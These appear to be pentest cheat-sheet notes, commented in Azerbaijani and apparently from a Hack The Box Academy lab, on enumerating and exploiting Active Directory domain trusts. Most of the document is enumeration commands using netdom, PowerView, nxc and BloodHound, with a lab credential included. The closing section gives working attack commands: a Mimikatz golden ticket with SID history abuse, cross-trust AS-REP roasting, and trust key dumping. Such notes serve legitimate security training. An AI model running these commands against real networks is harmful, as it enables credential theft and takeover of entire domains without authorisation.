# Trust Enumeration

### Local Enumeration
```
netdom query /domain:inlanefreight.local trust       ---> Mövcud domain üçün bütün trust əlaqələrini göstərir.
netdom query /domain:inlanefreight.local dc          ---> Domain Controller-lərin (DC) siyahısını çıxarır.
netdom query /domain:inlanefreight.local workstation ---> Şəbəkədəki iş stansiyalarını siyahılayır.
nltest /domain_trusts                                ---> Bütün etibarlı domainləri və onların növünü göstərir.
```
### AD Module
```
Import-Module activedirectory
Get-ADTrust -Filter *
```

### PowerView
```
# Mövcud domain üçün bütün trust-ları göstər
Get-DomainTrust

# Xarici (External) və ya digər Forest trust-larını tap
Get-DomainTrust -Domain dev.local

# Detallı baxış (Mənbə, Hədəf, Növ, İstiqamət)
Get-DomainTrust | Select-Object SourceName, TargetName, TrustType, TrustDirection
```

### Trust Xəritələnməsi və Kənar Domain İstifadəçiləri
```
# Bütün trust əlaqələrini vizual xəritə şəklində siyahılayır
Get-DomainTrustMapping

# Digər domendəki (məs: LOGISTICS) istifadəçiləri siyahılamaq
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

### Remote Enumeration (Linux/Kali)
```
# Domain trust-larını və onların istiqamətini görmək üçün
nxc smb 10.129.16.52 -u 'htb-student' -p 'Academy_student_AD!' --trusted-domains

# Bloodhound
SharpHound: Məlumatları yığmaq üçün SharpHound.exe -c All işlədin.
Sorgu: BloodHound interfeysində "Map Domain Trusts" hazır sorğusunu seçin.
```

### Trust Exploitation
```
# SID History Abuse (Golden Ticket)
# Child Domain krbtgt hash-i, Child SID və Parent Domain-in Enterprise Admins qrupunun SID-i lazımdır
kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-CHILD-SID /krbtgt:HASH /sids:S-1-5-21-PARENT-SID-519 /ticket:gold.kirbi

# Cross-Trust AS-REP Roasting
# GetNPUsers ilə digər domendəki istifadəçiləri hədəf alırıq
python3 GetNPUsers.py otherdomain.local/ -usersfile users.txt -dc-ip 10.129.16.53 -request

# Trust Key Hücumu
# Mimikatz vasitəsilə
lsadump::trust /patch
```

